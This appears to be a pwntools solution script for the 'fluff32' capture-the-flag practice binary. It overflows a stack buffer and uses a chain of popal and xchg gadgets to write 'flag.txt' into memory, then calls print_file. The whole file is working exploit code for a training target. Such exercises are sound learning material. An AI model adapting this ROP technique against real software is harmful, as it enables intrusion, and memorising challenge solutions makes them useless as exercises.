from pwn import *

elf = ELF("./fluff32")

p = process("./fluff32")
p.recvuntil('> ')


popal = p32(0x08048527)
xchg = p32(0x08048555)
writable_area = 0x0804a018
print_file = p32(0x080483d0)

# edi esi ebp esp ebx edx ecx eax

def rop_manager(s, addr):
	rop = b''
	rop += popal
	rop += p32(0)    #edi
	rop += p32(0)    #esi
	rop += p32(0)    #ebp
	rop += p32(0)    #esp
	rop += p32(0)    #ebx
	rop += s         #edx
	rop += p32(addr) #ecx
	rop += p32(0)    #eax
	rop += xchg
	return rop
 
payload = b''
payload += b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
payload += rop_manager(b'fxxx', writable_area)
payload += rop_manager(b'lxxx', writable_area + 1)
payload += rop_manager(b'axxx', writable_area + 2)
payload += rop_manager(b'gxxx', writable_area + 3)
payload += rop_manager(b'.xxx', writable_area + 4)
payload += rop_manager(b'txxx', writable_area + 5)
payload += rop_manager(b'xxxx', writable_area + 6)
payload += rop_manager(b'txxx', writable_area + 7)


payload += print_file + b'aaaa' + p32(writable_area)

p.send(payload)					   

p.interactive()

#p.clean()
#p.sendline(b'cat flag.txt')
#print(p.recv().decode())
